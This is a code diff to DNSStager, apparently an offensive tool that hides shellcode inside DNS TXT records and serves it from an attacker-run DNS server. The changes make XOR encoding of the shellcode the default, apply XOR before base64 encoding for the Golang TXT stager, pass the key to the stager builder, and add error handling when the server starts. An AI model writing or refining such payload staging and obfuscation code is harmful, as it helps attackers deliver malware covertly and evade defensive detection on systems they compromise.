@@ -129,8 +129,8 @@ if payload in dnsstager_payloads:
         print_info("DNSStager will encode your payload using XOR key %s" % original_key)
     else:
         print_info("DNSStager will not encode your payload using XOR")
-        encode_answer = input("[?]\033[1m We recommend to XOR your shellcode before you transfer it, are you sure you want to continue (y/n) \033[0m")
-        if encode_answer.upper() != "Y":
+        encode_answer = input("[?]\033[1m We recommend to XOR your shellcode before you transfer it, do you want to encode your payload (y/n) \033[0m")
+        if encode_answer.upper() != "N":
             new_key = input("Please enter the new XOR key (EX: 0x20) >> ")
             key = convert_string_key_to_int(new_key)
 
@@ -149,9 +149,10 @@ if payload in dnsstager_payloads:
 
     if language == "golang" and mode == "txt":
         # call golang txt
-        encoded_shellcode = encode_shellcode_base64(shellcode)
+        encoded_xor_shellcode = encode_xor_shellcode(shellcode, key).encode()
+        encoded_shellcode = encode_shellcode_base64(encoded_xor_shellcode)
         ZONES = generate_zone_TXT(domain, encoded_shellcode, prefix)
-        build_golang_base64_txt(domain_to_use, prefix, sleep, output, arch)
+        build_golang_base64_txt(domain_to_use, prefix, sleep, output, arch, key)
 
 else:
     print_error("Payload not found, please use --payloads to list all payloads")
@@ -161,7 +162,10 @@ else:
 print_success("Starting DNS server .. ")
 resolver = Resolver(ZONES)
 
-server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
-print_success("Server started!")
-
-server.start()
+try:
+    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
+    print_success("Server started!")
+    server.start()
+except Exception as e:
+    print_error("Can't start DNS server!")
+    print_error(e)
